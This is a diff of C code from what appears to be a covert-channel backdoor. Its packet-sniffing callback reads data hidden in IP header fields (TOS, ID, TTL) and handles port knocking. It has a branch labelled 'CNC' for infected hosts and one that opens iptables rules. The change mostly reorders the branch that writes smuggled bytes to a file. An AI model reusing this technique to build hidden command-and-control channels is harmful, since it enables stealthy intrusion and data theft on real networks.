@@ -84,7 +84,6 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
         printf("TOS: %c\n", ip->ip_tos);
         printf("TTL: %c\n", ip->ip_ttl);
         printf("Infected: %d\n", Filter->infected);
-
         if(CheckKey(ip->ip_tos, ip->ip_id, true, false)){
             //port knocking packet
             const struct sniff_udp *udp;
@@ -97,7 +96,6 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
             printf("Dst port: %d\n", ntohs(udp->uh_dport));
             for(int k = 0; k < Filter->amount; k++){
                 if(Filter->port_ushort[k] == udp->uh_sport){
-                    printf("");
                     Filter->pattern[k] = 1;
                 }
             }
@@ -109,19 +107,7 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
                 printf("WAITING FOR DATA\n");
                 iptables(Filter->targetip, "tcp", PORT, true, true);
                 //pcap_breakloop(interfaceinfo);
-            } else if(CheckKey(ip->ip_tos, ip->ip_id, false, false)){
-            //normal packet
-            FILE *file;
-            if((file = fopen(FILENAME, "a+b")) < 0){
-                perror("fopen");
-                exit(1);
             }
-            printf("Output: %c\n", ip->ip_ttl);
-            fprintf(file, "%c", ip->ip_ttl);
-            fflush(file);
-            fclose(file);
-            //port knocking packet
-
         } else if(ip->ip_id == 'x' && ip->ip_tos == 'x' && ip->ip_ttl == 'r' && Filter->infected == false){
             //CNC
             //close loop end of results
@@ -140,8 +126,7 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
             //open iptables
             //port knock
             //send results
-            //close loop end of resuls
-            //
+            //close loop end of results
             FILE *file;
             if((file = fopen(FILENAME, "wb+")) < 0){
                 perror("fopen");
@@ -169,7 +154,20 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
             printf("EXIT LOOP");
             pcap_breakloop(interfaceinfo);
     }
-    }
+        if(CheckKey(ip->ip_tos, ip->ip_id, false, false)){
+            //normal packet
+            FILE *file;
+            if((file = fopen(FILENAME, "a+b")) < 0){
+                perror("fopen");
+                exit(1);
+            }
+            printf("Output: %c\n", ip->ip_ttl);
+            fprintf(file, "%c", ip->ip_ttl);
+            fflush(file);
+            fclose(file);
+            //port knocking packet
+
+        }
 }
 
 void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet){
